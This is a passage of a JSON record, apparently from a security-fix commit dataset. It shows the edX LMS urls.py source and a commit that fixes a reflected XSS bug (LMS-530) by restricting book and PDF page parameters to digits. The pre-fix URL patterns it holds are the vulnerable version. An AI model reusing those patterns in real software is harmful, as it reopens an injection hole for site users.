'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ", "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.pdf_index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n            'staticbook.views.pdf_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n            'staticbook.views.html_index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"}}, "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page.\n\nConflicts:\n\tlms/urls.py"}, "5fad9ccca43cdfb565b3f80914f998afa7f2fa78": {"url": "https://api.github.com/repos/jlrivera81/incr-228/commits/5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "html_url": "https://github.com/jlrivera81/incr-228/commit/5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "sha": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "keyword": "XSS malicious", "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 51c6ba13b7..b131bb8f0b 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,24 +223,24 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             